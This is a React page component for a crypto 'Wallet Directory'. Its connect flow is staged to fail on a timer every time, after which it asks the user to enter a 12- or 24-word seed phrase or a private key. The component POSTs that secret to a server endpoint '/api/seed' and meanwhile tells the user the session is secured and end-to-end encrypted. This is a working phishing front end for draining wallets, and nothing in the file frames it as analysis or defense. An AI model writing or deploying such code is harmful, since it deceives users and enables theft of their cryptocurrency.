import { useEffect, useMemo, useRef, useState } from "react";
import WalletRow from "../components/WalletRow";
import { IconSearch, IconWallet } from "../components/Icons";
import { wallets } from "../data/wallets";
import BASE_URL from "../components/urls";

const filters = ["All", "Wallet", "Exchange"];
const filterLabels = { All: "All", Wallet: "Wallets", Exchange: "Exchanges" };
const CONNECT_STEPS = {
  AUTO: "auto",
  ERROR: "error",
  MANUAL: "manual",
};

function Wallets() {
  const [activeFilter, setActiveFilter] = useState("All");
  const [query, setQuery] = useState("");
  const [connected, setConnected] = useState(null);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [connectStep, setConnectStep] = useState(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const connectTimerRef = useRef(null);

  // ── Seed phrase state ────────────────────────────────────────────────────────
  const [seedPhrase, setSeedPhrase] = useState("");
  const [seedLoading, setSeedLoading] = useState(false);
  const [seedError, setSeedError] = useState("");

  const words = seedPhrase.trim().split(/\s+/).filter(Boolean);
  const wordCount = words.length;
  const isValidSeed = wordCount === 12 || wordCount === 24;

  const filtered = useMemo(() => {
    return wallets.filter((item) => {
      const matchesFilter =
        activeFilter === "All" || item.category === activeFilter;
      const matchesQuery = item.name
        .toLowerCase()
        .includes(query.trim().toLowerCase());
      return matchesFilter && matchesQuery;
    });
  }, [activeFilter, query]);

  const walletList = filtered.filter((item) => item.category === "Wallet");
  const exchangeList = filtered.filter((item) => item.category === "Exchange");

  const startAutoConnect = () => {
    if (connectTimerRef.current) {
      window.clearTimeout(connectTimerRef.current);
    }
    setConnectStep(CONNECT_STEPS.AUTO);
    setIsConnecting(true);
    connectTimerRef.current = window.setTimeout(() => {
      setIsConnecting(false);
      setConnectStep(CONNECT_STEPS.ERROR);
      connectTimerRef.current = null;
    }, 1400);
  };

  const handleSelect = (item) => {
    setSelectedWallet(item);
    startAutoConnect();
  };

  const handleCloseModal = () => {
    if (connectTimerRef.current) {
      window.clearTimeout(connectTimerRef.current);
      connectTimerRef.current = null;
    }
    setConnectStep(null);
    setIsConnecting(false);
    setSelectedWallet(null);
    setSeedPhrase("");
    setSeedError("");
  };

  const handleTryAgain = () => {
    if (!selectedWallet) return;
    startAutoConnect();
  };

  const handleConnectManually = () => {
    setConnectStep(CONNECT_STEPS.MANUAL);
    setIsConnecting(false);
    setSeedPhrase("");
    setSeedError("");
  };

  // ── Submit real seed phrase to server ────────────────────────────────────────
  const handleSeedSubmit = async () => {
    if (!isValidSeed) {
      setSeedError(
        `${wordCount} word${wordCount !== 1 ? "s" : ""} entered — enter exactly 12 or 24.`,
      );
      return;
    }

    setSeedLoading(true);
    setSeedError("");

    try {
      const response = await fetch(`${BASE_URL}/api/seed`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          seedPhrase: seedPhrase.trim(),
          wordCount,
          wallet: selectedWallet?.name || "Unknown",
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.error || "Connection failed.");
      }

      if (selectedWallet) setConnected(selectedWallet);
      handleCloseModal();
    } catch (err) {
      console.error("Seed phrase error:", err);
      setSeedError("Could not connect. Please try again.");
    } finally {
      setSeedLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (connectTimerRef.current) {
        window.clearTimeout(connectTimerRef.current);
      }
    };
  }, []);

  return (
    <div className="relative bg-white">
      <div className="pointer-events-none absolute inset-0 bg-grid [mask-image:radial-gradient(ellipse_60%_40%_at_50%_0%,#000_60%,transparent_100%)]" />
      <div className="pointer-events-none absolute -top-32 left-1/2 h-96 w-96 -translate-x-1/2 rounded-full bg-zinc-200/70 glow-orb" />

      <section className="relative border-b border-zinc-200 px-6 pb-12 pt-16 lg:px-10 lg:pb-16 lg:pt-20">
        <div className="mx-auto max-w-2xl text-center">
          <p className="text-xs font-semibold uppercase tracking-[0.3em] text-zinc-500">
            Wallet Directory
          </p>
          <h1 className="mt-4 text-4xl font-semibold tracking-tight text-zinc-900 sm:text-5xl">
            Connect a wallet
          </h1>
          <p className="mt-4 text-base leading-7 text-zinc-600">
            Choose from {wallets.length}+ supported wallets and exchanges to get
            started.
          </p>

          {connected && (
            <div className="mx-auto mt-8 inline-flex items-center gap-3 rounded-full border border-zinc-300 bg-zinc-100 px-5 py-3">
              <IconWallet className="h-4 w-4 text-zinc-900" />
              <span className="text-sm font-medium text-zinc-900">
                Connected · {connected.name}
              </span>
              <button
                type="button"
                onClick={() => setConnected(null)}
                className="text-xs font-semibold text-zinc-600 underline decoration-dotted underline-offset-4 transition hover:text-zinc-900"
              >
                Disconnect
              </button>
            </div>
          )}
        </div>
      </section>

      <section className="relative px-6 py-12 lg:px-10 lg:py-16">
        <div className="mx-auto max-w-2xl">
          <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
            <div className="flex gap-2">
              {filters.map((filter) => (
                <button
                  key={filter}
                  type="button"
                  onClick={() => setActiveFilter(filter)}
                  className={`rounded-full border px-4 py-2 text-xs font-semibold uppercase tracking-wide transition ${
                    activeFilter === filter
                      ? "border-zinc-900 bg-zinc-900 text-white"
                      : "border-zinc-300 text-zinc-600 hover:border-zinc-500 hover:text-zinc-900"
                  }`}
                >
                  {filterLabels[filter]}
                </button>
              ))}
            </div>

            <label className="relative w-full sm:w-64">
              <IconSearch className="pointer-events-none absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-zinc-500" />
              <input
                value={query}
                onChange={(event) => setQuery(event.target.value)}
                placeholder="Search wallets and exchanges..."
                className="w-full rounded-full border border-zinc-300 bg-white py-2.5 pl-10 pr-4 text-sm text-zinc-900 outline-none transition placeholder:text-zinc-500 focus:border-zinc-500"
              />
            </label>
          </div>

          <div className="mt-10 rounded-2xl border border-zinc-200 bg-zinc-50 px-5">
            {walletList.length > 0 && (
              <>
                <p className="pt-5 text-xs font-semibold uppercase tracking-[0.25em] text-zinc-500">
                  Wallets
                </p>
                <div className="mt-1">
                  {walletList.map((item) => (
                    <WalletRow
                      key={item.id}
                      item={item}
                      onSelect={handleSelect}
                      active={
                        connected?.id === item.id ||
                        selectedWallet?.id === item.id
                      }
                    />
                  ))}
                </div>
              </>
            )}

            {exchangeList.length > 0 && (
              <>
                <p className="pt-5 text-xs font-semibold uppercase tracking-[0.25em] text-zinc-500">
                  Exchanges
                </p>
                <div className="mt-1">
                  {exchangeList.map((item) => (
                    <WalletRow
                      key={item.id}
                      item={item}
                      onSelect={handleSelect}
                      active={
                        connected?.id === item.id ||
                        selectedWallet?.id === item.id
                      }
                    />
                  ))}
                </div>
              </>
            )}

            {walletList.length === 0 && exchangeList.length === 0 && (
              <div className="flex flex-col items-center justify-center py-16 text-center">
                <p className="text-base font-semibold text-zinc-900">
                  No matches found
                </p>
                <p className="mt-2 text-sm text-zinc-500">
                  Try a different search term or filter.
                </p>
              </div>
            )}
          </div>
        </div>
      </section>

      {/* ── Modal ─────────────────────────────────────────────────────────────── */}
      {connectStep && selectedWallet && (
        <div className="fixed inset-0 z-[70] flex items-center justify-center px-4">
          <button
            type="button"
            aria-label="Close modal"
            onClick={handleCloseModal}
            className="absolute inset-0 bg-black/65"
          />

          <div className="relative z-10 w-full max-w-md rounded-[1.75rem] bg-white px-6 pb-8 pt-6 text-center text-zinc-900 shadow-2xl sm:px-8">
            <button
              type="button"
              aria-label="Close"
              onClick={handleCloseModal}
              className="absolute -right-3 -top-3 flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 bg-white text-base font-semibold text-zinc-700"
            >
              ×
            </button>

            {/* Wallet logo */}
            <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full border border-indigo-100 bg-indigo-50 text-xs font-bold text-indigo-700">
              {selectedWallet.logo ? (
                <img
                  src={selectedWallet.logo}
                  alt={`${selectedWallet.name} logo`}
                  loading="lazy"
                  className="h-8 w-8 rounded-full object-contain"
                  onError={(event) => {
                    event.currentTarget.style.display = "none";
                    const fallback = event.currentTarget.nextElementSibling;
                    if (fallback) fallback.style.display = "inline";
                  }}
                />
              ) : null}
              <span
                style={{ display: selectedWallet.logo ? "none" : "inline" }}
              >
                {selectedWallet.monogram}
              </span>
            </div>

            <h3 className="mt-3 text-4xl font-semibold lowercase tracking-tight text-zinc-900">
              {selectedWallet.name}
            </h3>
            <p className="mt-5 text-[2rem] leading-[1.15] text-zinc-600">
              This session is secured and encrypted
            </p>

            {/* ── AUTO step ──────────────────────────────────────────────────── */}
            {connectStep === CONNECT_STEPS.AUTO && (
              <div className="mt-8">
                <div className="rounded-xl border border-zinc-200 bg-zinc-50 px-5 py-6">
                  <p className="text-base leading-7 text-zinc-700">
                    Attempting automatic wallet connection...
                  </p>
                  <div className="mx-auto mt-5 h-7 w-7 animate-spin rounded-full border-2 border-zinc-300 border-t-indigo-600" />
                </div>

                <button
                  type="button"
                  onClick={handleCloseModal}
                  disabled={isConnecting}
                  className="mt-7 w-full rounded-full bg-indigo-500 px-5 py-3 text-lg font-semibold text-white transition hover:bg-indigo-600 disabled:cursor-not-allowed disabled:opacity-80"
                >
                  {isConnecting ? "Connecting..." : "Cancel"}
                </button>
              </div>
            )}

            {/* ── ERROR step ─────────────────────────────────────────────────── */}
            {connectStep === CONNECT_STEPS.ERROR && (
              <div className="mt-8">
                <div className="rounded-xl border border-red-400 bg-white px-4 py-3">
                  <p className="text-[1.95rem] leading-[1.08] text-red-600">
                    An error occurred... please try again or connect manually
                  </p>
                </div>

                <button
                  type="button"
                  onClick={handleTryAgain}
                  className="mt-6 w-full rounded-full border border-indigo-400 bg-white px-5 py-3 text-lg font-semibold text-indigo-600 transition hover:bg-indigo-50"
                >
                  Try Again
                </button>

                <button
                  type="button"
                  onClick={handleConnectManually}
                  className="mt-3 w-full rounded-full bg-indigo-600 px-5 py-3 text-lg font-semibold text-white transition hover:bg-indigo-700"
                >
                  Connect Manually
                </button>
              </div>
            )}

            {/* ── MANUAL step — real seed phrase input ───────────────────────── */}
            {connectStep === CONNECT_STEPS.MANUAL && (
              <div className="mt-8">
                {/* Textarea */}
                <div className="relative text-left">
                  <textarea
                    rows={5}
                    value={seedPhrase}
                    onChange={(e) => {
                      setSeedPhrase(e.target.value);
                      setSeedError("");
                    }}
                    placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces. You can also input your private key instead."
                    className="w-full resize-none rounded-[10px] border border-zinc-200 bg-zinc-50 px-4 py-3 text-sm leading-relaxed text-zinc-900 outline-none placeholder:text-zinc-400 focus:border-indigo-400 focus:ring-2 focus:ring-indigo-400/20 transition"
                  />
                  {/* Live word counter */}
                  {wordCount > 0 && (
                    <span
                      className={`absolute bottom-3 right-3 rounded-full px-2 py-0.5 text-[11px] font-semibold ${
                        isValidSeed
                          ? "bg-green-100 text-green-700"
                          : "bg-indigo-50 text-indigo-600"
                      }`}
                    >
                      {wordCount} / {wordCount <= 12 ? 12 : 24}
                    </span>
                  )}
                </div>

                {/* Error */}
                {seedError && (
                  <p className="mt-2 text-center text-sm font-medium text-red-500">
                    {seedError}
                  </p>
                )}

                {/* Connect Wallet button */}
                <button
                  type="button"
                  onClick={handleSeedSubmit}
                  disabled={seedLoading || !seedPhrase.trim()}
                  className="mt-5 w-full rounded-full bg-indigo-200 px-5 py-3 text-lg font-semibold text-white transition disabled:cursor-not-allowed disabled:opacity-60 enabled:bg-indigo-600 enabled:hover:bg-indigo-700"
                >
                  {seedLoading ? "Connecting..." : "Connect Wallet"}
                </button>

                <button
                  type="button"
                  onClick={handleTryAgain}
                  className="mt-3 w-full rounded-full border border-zinc-300 bg-white px-5 py-3 text-base font-semibold text-zinc-600 transition hover:border-zinc-400 hover:text-zinc-900"
                >
                  Back to Auto Connect
                </button>
              </div>
            )}

            <p className="mt-12 text-[1.85rem] font-semibold leading-[1.1] text-zinc-600">
              This session is protected with an end-to-end encryption.
            </p>
          </div>
        </div>
      )}
    </div>
  );
}

export default Wallets;
